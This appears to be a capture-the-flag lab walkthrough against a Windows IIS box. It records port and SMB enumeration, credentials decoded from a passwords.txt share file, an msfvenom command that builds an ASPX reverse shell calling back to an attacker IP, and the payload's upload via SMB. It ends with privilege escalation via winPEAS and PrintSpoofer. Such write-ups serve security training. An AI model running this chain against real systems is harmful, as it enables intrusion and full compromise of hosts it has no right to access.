result of nmap on target
	80/tcp   open  http          Microsoft IIS httpd 10.0
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

result of nmap script scan
	$ nmap -v --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 $TARGET_IP

	PORT     STATE SERVICE
	3389/tcp open  ms-wbt-server
	| rdp-enum-encryption: 
	|   Security layer
	|     CredSSP (NLA): SUCCESS
	|     CredSSP with Early User Auth: SUCCESS
	|_    RDSTLS: SUCCESS
	| rdp-ntlm-info: 
	|   Target_Name: RELEVANT
	|   NetBIOS_Domain_Name: RELEVANT
	|   NetBIOS_Computer_Name: RELEVANT
	|   DNS_Domain_Name: Relevant
	|   DNS_Computer_Name: Relevant
	|   Product_Version: 10.0.14393
	|_  System_Time: 2021-09-06T12:06:00+00:00

	$ nmap -v -script=smb-enum-shares $TARGET_IP

	Host script results:
	| smb-enum-shares: 
	|   account_used: guest
	|   \\10.10.38.105\ADMIN$: 
	|     Type: STYPE_DISKTREE_HIDDEN
	|     Comment: Remote Admin
	|     Anonymous access: <none>
	|     Current user access: <none>
	|   \\10.10.38.105\C$: 
	|     Type: STYPE_DISKTREE_HIDDEN
	|     Comment: Default share
	|     Anonymous access: <none>
	|     Current user access: <none>
	|   \\10.10.38.105\IPC$: 
	|     Type: STYPE_IPC_HIDDEN
	|     Comment: Remote IPC
	|     Anonymous access: <none>
	|     Current user access: READ/WRITE
	|   \\10.10.38.105\nt4wrksv: 
	|     Type: STYPE_DISKTREE
	|     Comment: 
	|     Anonymous access: <none>
	|_    Current user access: READ/WRITE

passwords.txt found in nt4wrksv share
	[User Passwords - Encoded]
	Qm9iIC0gIVBAJCRXMHJEITEyMw==
	QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
decoded result (Base64)
	Bob - !P@$$W0rD!123
	Bill - Juw4nnaM4n420696969!$$$

It turned out these credentials are useless.
Rescanning all ports,,,(nmap -v -sV -p1-65535 $TARGET_IP)
	Discovered open port 49663/tcp on 10.10.2.149

Enumerating $TARGET_IP:49663 using gobuster,,,(gobuster dir -u http://$TARGET_IP:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster_on_49663)
	found a directory named nt4wrksv

Enumerating $TARGET_IP:49663/nt4wrksv using gobuster,,,(gobuster dir -u http://$TARGET_IP:49663/nt4wrksv -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .txt,.md | tee gobuster_on_49663_nt4wrksv)
	found the same txt file (passwords.txt)

Creating reverse shell payloads in aspx format because this is IIS environment
	$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.15.55 LPORT=4444 -f aspx -o revshell.aspx
Uploading this to nt4wrksv directory through smb connection...

Found user.txt in Users/Bob/Desktop

Ran winPEASx64 (output_winpeas)

Ran PrintSpoofer.exe on the system.
Found root.txt in Users/Administrator/Desktop
